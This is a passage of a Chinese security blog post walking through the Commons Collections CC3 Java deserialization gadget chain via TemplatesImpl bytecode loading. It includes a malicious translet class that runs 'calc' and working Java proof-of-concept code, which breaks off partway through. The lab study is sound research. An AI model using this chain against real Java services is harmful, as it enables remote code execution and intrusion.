@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="实验环境： JDK-8u65、commons-collections 3.2.1 CC2、CC3、CC4不是命令执行的链子，而是代码执行（加载字节码文件，实现代码执行） ClassLoader类的loadClass方法加载过程：findClass方法 –&gt; defineClass方法（从字节中加载类） 实战分析只进行类加载的话，是不会执行代码的；初始化后，就会执行代码 利用点：com.sun">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CC3-TemplatesImpl链">
+<meta property="og:url" content="https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/index.html">
+<meta property="og:site_name" content="sh1y1n9aI&#39;s blog">
+<meta property="og:description" content="实验环境： JDK-8u65、commons-collections 3.2.1 CC2、CC3、CC4不是命令执行的链子，而是代码执行（加载字节码文件，实现代码执行） ClassLoader类的loadClass方法加载过程：findClass方法 –&gt; defineClass方法（从字节中加载类） 实战分析只进行类加载的话，是不会执行代码的；初始化后，就会执行代码 利用点：com.sun">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000400039.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000424534.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000459158.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000550505.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000614624.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000629564.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000644042.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000658943.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000713648.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000722855.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000737922.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000747034.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000758850.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000816157.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000835540.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000854795.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000909397.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000928221.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424000953040.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001021265.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001046457.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001140954.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001158524.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001216832.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001230902.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001245495.png">
+<meta property="article:published_time" content="2023-03-07T16:02:34.000Z">
+<meta property="article:modified_time" content="2024-04-23T16:13:28.921Z">
+<meta property="article:author" content="sh1y1n9aI">
+<meta property="article:tag" content="CC链">
+<meta property="article:tag" content="Commons Collections">
+<meta property="article:tag" content="TemplatesImpl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sh1y1n9ai.github.io/images/image-20240424000400039.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CC3-TemplatesImpl链</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="sh1y1n9aI&#39;s blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/05/26/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/03/07/CC6-HashMap%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&text=CC3-TemplatesImpl链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&title=CC3-TemplatesImpl链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&is_video=false&description=CC3-TemplatesImpl链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CC3-TemplatesImpl链&body=Check out this article: https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&title=CC3-TemplatesImpl链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&title=CC3-TemplatesImpl链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&title=CC3-TemplatesImpl链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&title=CC3-TemplatesImpl链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&name=CC3-TemplatesImpl链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&t=CC3-TemplatesImpl链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">实战分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">调用链</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CC3-TemplatesImpl链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">sh1y1n9aI</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-07T16:02:34.000Z" class="dt-published" itemprop="datePublished">2023-03-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/">Java反序列化漏洞专题</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CC%E9%93%BE/" rel="tag">CC链</a>, <a class="p-category" href="/tags/Commons-Collections/" rel="tag">Commons Collections</a>, <a class="p-category" href="/tags/TemplatesImpl/" rel="tag">TemplatesImpl</a>
+    </div>
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>实验环境： JDK-8u65、commons-collections 3.2.1</p>
+<p><strong>CC2、CC3、CC4不是命令执行的链子，而是代码执行（加载字节码文件，实现代码执行）</strong></p>
+<p>ClassLoader类的loadClass方法加载过程：findClass方法 –&gt; defineClass方法（从字节中加载类）</p>
+<h3 id="实战分析"><a href="#实战分析" class="headerlink" title="实战分析"></a>实战分析</h3><p>只进行类加载的话，是不会执行代码的；初始化后，就会执行代码</p>
+<p>利用点：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 类中定义了一个内部类 TransletClassLoader ，在此类中继承了ClassLoader类并重写了defineClass方法</p>
+<p>可以利用内部类TransletClassLoader这个重写的defineClass方法实现加载任意的恶意类文件</p>
+<p><img src="/../images/image-20240424000400039.png" alt="image-20240424000400039"></p>
+<p>defineClass这是个方法，返回类型是Class类型；可以看一下它继承的ClassLoader类中，说明它是个方法（m图标并且有返回值）</p>
+<p><img src="/../images/image-20240424000424534.png" alt="image-20240424000424534"></p>
+<p>那么就下来就是继续跟踪defineClass方法，看看哪里调用到；发现在当前类直接就有调用，通过defineTransletClasses方法调用，把结果保存在 _class 参数中</p>
+<p><img src="/../images/image-20240424000459158.png" alt="image-20240424000459158"></p>
+<p>继续跟踪defineTransletClasses方法，在getTransletInstance方法中有调用。</p>
+<p>分析：</p>
+<p>如果参数 _class 的值为null，就会调用defineTransletClasses方法；而在defineTransletClasses方法中会调用defineClass方法并把结果存放在 _class 中，获得 _class 参数后，继续往下执行就会调用到newInstance方法，该方法被调用后，就会进行初始化，从而指定通过defineClass方法加载的恶意代码（字节码文件）。</p>
+<p><img src="/../images/image-20240424000550505.png" alt="image-20240424000550505"></p>
+<p>继续跟踪getTransletInstance方法：最终在newTransformer方法中找到调用，并且newTransformer方法是public修饰的，可以直接调用而无需反射。那么链子基本上就构成了；只要调用newTransformer方法，就会一直调用到defineClass方法，来加载恶意字节码文件，构造任意代码执行。</p>
+<p>流程：【 newTransformer() –&gt; getTransletInstance() –&gt; defineTransletClasses() –&gt; defineClass() –&gt; newInstance() 】</p>
+<p><img src="/../images/image-20240424000614624.png" alt="image-20240424000614624"></p>
+<p>构造POC，前面已经把链子的大致流程梳理出来了。接下来就是构造满足参数条件的POC</p>
+<p><img src="/../images/image-20240424000629564.png" alt="image-20240424000629564"></p>
+<p>分析：</p>
+<p>newTransformer方法调用getTransletInstance方法，跟进getTransletInstance方法：参数_name必须不为null，否则就会直接return；参数_class就不用管，本身参数_class的值就是通过defineTransletClasses方法获得的。</p>
+<p><img src="/../images/image-20240424000644042.png" alt="image-20240424000644042"></p>
+<p>继续跟进defineTransletClasses方法：参数_bytecodes必须不为null，这样才不会抛出异常；参数_tfactary也不能为空，不然程序就无法继续执行下去</p>
+<p><img src="/../images/image-20240424000658943.png" alt="image-20240424000658943"></p>
+<p>参数_bytecodes的格式要求：先查看定义，是一个二维数据，在defineTransletClasses方法中传入的是一维数组，通过遍历把每个一维数组依次传入；这个参数是用来接收恶意字节码文件的二进制流的</p>
+<p><img src="/../images/image-20240424000713648.png" alt="image-20240424000713648"></p>
+<p><img src="/../images/image-20240424000722855.png" alt="image-20240424000722855"></p>
+<p>参数 _tfactory要求：</p>
+<p>这是一个transit修饰的参数，反序列化时获取不到值，所以就算通过反射修改了内容，反序列化也没有用，但是如果不加上内容肯定汇报空指针错误，导致代码无法执行。</p>
+<p>既然TemplatesIMpl类是继承Serializeable接口的，那说明该类可以进行序列化，既然能进行序列化，那么参数 _tfactory肯定是有值的，就只有可能在该类的readObject方法中就赋好初始值。这样子的话，在反序列化TemplatesImpl这个类的时候，就是触发readObject这个方法，然后自动给参数_tfactory赋初始值。</p>
+<p><img src="/../images/image-20240424000737922.png" alt="image-20240424000737922"></p>
+<p><img src="/../images/image-20240424000747034.png" alt="image-20240424000747034"></p>
+<p>编写恶意类并编译成字节码文件</p>
+<p><img src="/../images/image-20240424000758850.png" alt="image-20240424000758850"></p>
+<p>构造符合条件的参数</p>
+<p><img src="/../images/image-20240424000816157.png" alt="image-20240424000816157"></p>
+<p>运行POC，爆了空指针异常</p>
+<p><img src="/../images/image-20240424000835540.png" alt="image-20240424000835540"></p>
+<p>跟过去到defineTransletClasses方法看看，debug断点在defineTransletClasses方法分析看看：参数_bytecodes和参数_tfactory都是符合要求的，继续执行下去； </p>
+<p><img src="/../images/image-20240424000854795.png" alt="image-20240424000854795"></p>
+<p>defineClass方法的类加载也没有问题，可以执行下去，继续跟下去分析</p>
+<p><img src="/../images/image-20240424000909397.png" alt="image-20240424000909397"></p>
+<p>最终定位到参数_auxClasses是的null值，导致报错。defineTransletClasses方法要全部完全正确执行，才不会影响到链子，所以这里需要处理一下。</p>
+<p>分析代码：有个IF判断，现在就是两种解决思路：①满足IF判断的第一个条件，不执行到else，就不用给参数_auxClasses赋值了。②给参数_auxClasses赋值</p>
+<p>第一个IF判断条件：获取参数_class类的父类判断是否和常量ABSTRACT_TRANSLET相同，相同就进入IF判断。但是如果不进入第一个判断，而是进入else的话，那么参数_transletIndex的值默认就为 -1。就会进入第426行代码，抛出异常。所以这边不能让程序走到else语句中，那就要修改恶意类的代码，参数_class就是读取的恶意类。</p>
+<p><img src="/../images/image-20240424000928221.png" alt="image-20240424000928221"></p>
+<p>修改恶意类，直接让恶意类继承AbstractTranslet，这样子获得的父类就相同了。</p>
+<p>继承后，提示需要实现抽象方法（AbstractTranslet是一个抽象类）</p>
+<p><img src="/../images/image-20240424000953040.png" alt="image-20240424000953040"></p>
+<p>直接点击实现即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author shiyingai</span><br><span class="line"> * @create 2023-03-09 20:22</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class RCE extends AbstractTranslet&#123;</span><br><span class="line">    static &#123;    // 静态代码块或者构造代码块都可以，因为会进行初始化，两种都会被调用</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240424001021265.png" alt="image-20240424001021265"></p>
+<p>再次运行POC即可正常弹出计算器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.TransformerConfigurationException;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author shiyingai</span><br><span class="line"> * @create 2023-03-09 15:04</span><br><span class="line"> */</span><br><span class="line">public class CC3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        /* 参数控制 */</span><br><span class="line">        Class templatesClass = templates.getClass();</span><br><span class="line">        // 修改 _name 参数</span><br><span class="line">        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        nameField.setAccessible(true);</span><br><span class="line">        nameField.set(templates,&quot;test&quot;);</span><br><span class="line">        // 修改 _bytecodes 参数</span><br><span class="line">        Field bytecodesFidld = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodesFidld.setAccessible(true);</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\JavaSecurity\\CC\\target\\classes\\RCE.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesFidld.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        // 修改 _tfactory 参数</span><br><span class="line">        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        tfactoryField.setAccessible(true);</span><br><span class="line">        tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240424001046457.png" alt="image-20240424001046457"></p>
+<ul>
+<li>场景1</li>
+</ul>
+<p>这里利用链已经构造好了，可以直接使用之前CC1的入口即可；假设实际环境，ban了Runtime类的话，就可以使用这条链子，这条链子是代码执行。这里还是利用InvokerTransformer类的transform方法来替换调用这行代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure>
+
+<p>完整POC1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.TransformerConfigurationException;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author shiyingai</span><br><span class="line"> * @create 2023-03-09 15:04</span><br><span class="line"> */</span><br><span class="line">public class CC3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        /* 参数控制 */</span><br><span class="line">        Class templatesClass = templates.getClass();</span><br><span class="line">        // 修改 _name 参数</span><br><span class="line">        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        nameField.setAccessible(true);</span><br><span class="line">        nameField.set(templates,&quot;test&quot;);</span><br><span class="line">        // 修改 _bytecodes 参数</span><br><span class="line">        Field bytecodesFidld = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodesFidld.setAccessible(true);</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\JavaSecurity\\CC\\target\\classes\\RCE.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesFidld.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        // 修改 _tfactory 参数</span><br><span class="line">        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        tfactoryField.setAccessible(true);</span><br><span class="line">        tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // templates.newTransformer();</span><br><span class="line"></span><br><span class="line">        Transformer[] transforms = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;,null,null),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class="line">        // 以上代码是为了实现Runtime参与序列化，反射调用RCE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;,&quot;value_test&quot;);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class annotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationHandlerConstructor =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        